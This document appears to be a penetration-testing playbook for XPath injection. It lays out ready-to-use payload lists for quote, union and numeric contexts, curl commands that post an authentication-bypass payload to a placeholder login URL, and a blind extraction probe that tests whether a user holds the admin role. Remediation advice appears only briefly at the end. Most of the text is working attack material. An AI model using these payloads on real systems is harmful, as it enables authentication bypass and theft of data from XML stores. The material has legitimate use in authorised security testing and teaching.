# XPath Injection Payloads

## Overview
XPath injection manipulates XML query expressions to bypass auth or extract data
when user input is concatenated into XPath queries.

## Phase 1: Identify Context
```bash
# Common patterns:
# "//user[name/text()='{input}']/password"
# "//user[username='{input}' and password='{pass}']"
# "//item[id={input}]"
```

## Phase 2: Payload List
```bash
cat > /workspace/output/TARGET_xpath_payloads.txt <<'PAYLOADS'
# Single-quote context
' or '1'='1
' or 1=1 or 'a'='a
') or ('1'='1
' or count(//user)=1 or 'a'='b

# Double-quote context
" or "1"="1
") or ("1"="1

# Union / data extraction
'] | //* | ['a'='a
"] | //* | ["a"="a

# Numeric context
1 or 1=1
1) or 1=1 or (1=1
PAYLOADS
```

## Phase 3: Test Examples
```bash
TARGET_URL="https://TARGET/login"

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=' or '1'='1&password=test" \
  | tee /workspace/output/TARGET_xpath_test_1.txt
```

## Phase 4: Boolean Extraction (Blind)
```bash
# Example: test if first user has admin role
# payload: ' or (//user[1]/role='admin') or 'a'='b

curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=' or (//user[1]/role='admin') or 'a'='b&password=test" \
  | tee /workspace/output/TARGET_xpath_test_2.txt
```

## Phase 5: Response Analysis
```bash
# Compare status codes, body length, or error messages to infer true/false
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] XPath query bypass via injection
- [ ] Data extraction from XML documents

## Evidence
- Response: /workspace/output/TARGET_xpath_test_1.txt
- Blind test: /workspace/output/TARGET_xpath_test_2.txt

## Recommendations
1. Use parameterized XPath libraries
2. Escape quotes and special XPath characters
3. Validate inputs against strict allowlists
```

## Output Files
- `/workspace/output/TARGET_xpath_payloads.txt` — payload list
- `/workspace/output/TARGET_xpath_test_1.txt` — test response
- `/workspace/output/TARGET_xpath_test_2.txt` — blind test

indicators: xpath injection, xml injection, xpath bypass, xpath payloads
